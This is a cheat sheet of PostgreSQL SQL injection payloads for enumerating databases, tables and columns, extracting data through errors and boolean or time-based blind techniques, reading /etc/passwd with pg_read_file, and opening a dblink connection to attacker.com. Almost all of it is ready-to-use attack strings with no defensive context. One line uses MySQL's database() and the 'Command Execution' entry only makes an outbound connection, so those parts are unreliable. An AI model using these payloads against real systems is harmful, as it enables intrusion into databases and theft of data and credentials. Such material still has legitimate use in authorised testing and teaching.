# PostgreSQL Specific Payloads

## Version Detection
```
' UNION SELECT version()--
' AND 1=CAST((SELECT version()) AS INT)--
```

## Database Enumeration
```
' UNION SELECT datname FROM pg_database--
' AND 1=CAST((SELECT string_agg(datname,',') FROM pg_database) AS INT)--
' UNION SELECT current_database()--
```

## Table Enumeration
```
' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--
' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS INT)--
```

## Column Enumeration
```
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users') AS INT)--
```

## Error-Based Extraction
```
' AND 1=CAST((SELECT database()) AS INT)--
' AND 1=CAST((SELECT version()) AS INT)--
' AND 1=CAST((SELECT current_user) AS INT)--
' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS INT)--
```

## Blind - Boolean
```
' AND LENGTH(current_database())=8--
' AND ASCII(SUBSTRING(current_database(),1,1))=112--
```

## Blind - Time
```
' AND (SELECT CASE WHEN (LENGTH(current_database())=8) THEN pg_sleep(3) ELSE pg_sleep(0) END)='x'--
' AND (SELECT CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))=112) THEN pg_sleep(3) ELSE pg_sleep(0) END)='x'--
```

## File Read (PostgreSQL)
```
' UNION SELECT pg_read_file('/etc/passwd')--
' UNION SELECT 1,pg_read_file('/etc/passwd'),3--
```

## Command Execution (PostgreSQL)
```
' AND 1=CAST((SELECT 1 FROM dblink('host=attacker.com port=4444 user=postgres password=pass','SELECT 1') AS t(col int)) AS INT)--
-- Requires dblink extension
```

## Common System Tables
```
pg_database                    -- Databases
pg_tables                      -- Tables
pg_user                        -- Users
pg_roles                       -- Roles
information_schema.columns     -- Columns
```
